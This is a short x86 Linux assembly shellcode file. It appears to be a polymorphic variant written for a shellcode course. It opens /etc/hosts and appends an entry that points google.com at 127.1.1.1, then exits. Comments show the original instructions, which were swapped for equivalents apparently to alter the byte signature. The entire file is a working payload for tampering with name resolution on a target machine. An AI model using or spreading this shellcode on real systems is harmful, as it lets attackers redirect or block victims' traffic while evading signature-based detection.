;modify_hosts.asm
;this program add a new entry in hosts file pointing google.com to 127.1.1.1 
;author Javier Tejedor
;date 24/09/2014

;
; Modified by Daniel Roberson SLAE-877
;

BITS 32

global _start

section .text

_start:
    sub eax, eax
    sub ecx, ecx    
    push eax
    ;push 0x7374736f     ;/etc///hosts
    ;push 0x682f2f2f
    ;push 0x6374652f
    push 0x7374736f      ;//etc//hosts
    push 0x682f2f63
    push 0x74652f2f
    mov ebx, esp
    ;mov cx, 0x401       ;permmisions
    add cx, 0x401
    add eax, 5
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    ;push 0x6
    ;pop eax
    sub eax, eax
    add eax, 6
    int 0x80        ;syscall to close the file

    ;push 0x1
    ;pop eax
    xor eax, eax
    inc eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

